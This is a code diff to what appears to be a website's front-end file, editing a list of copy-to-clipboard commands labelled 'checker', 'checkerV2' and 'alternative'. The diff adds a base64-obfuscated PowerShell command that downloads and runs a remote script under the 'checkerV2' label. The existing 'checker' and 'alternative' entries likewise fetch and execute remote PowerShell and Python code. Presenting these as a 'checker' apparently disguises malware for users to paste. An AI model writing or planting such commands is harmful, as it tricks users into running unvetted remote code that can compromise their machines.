@@ -14,7 +14,7 @@ function cn(...inputs: ClassValue[]) {
 // ==========================================
 const COPY_TEXTS = {
   checker: "iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KGl3ciBodHRwczovL2dpdGh1Yi5jb20vYWJzb2x1dGUyOTgyNzI4LWFpL3NjdC9yYXcvbWFpbi9zY3QucHMxIC1Vc2VCYXNpY1BhcnNpbmcp')))",
-  checkerV2: "cmd /c \"curl -sL https://example.com/v2.bat | cmd\"",
+  checkerV2: "iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KGl3ciBodHRwczovL2dpdGh1Yi5jb20vYWJzb2x1dGUyOTgyNzI4LWFpL3NjdDIvcmF3L21haW4vc2N0Mi5wczEgLVVzZUJhc2ljUGFyc2luZyk=')))",
   alternative: "python -c \"import urllib.request; exec(urllib.request.urlopen('https://example.com/alt.py').read())\""
 };
 // ==========================================
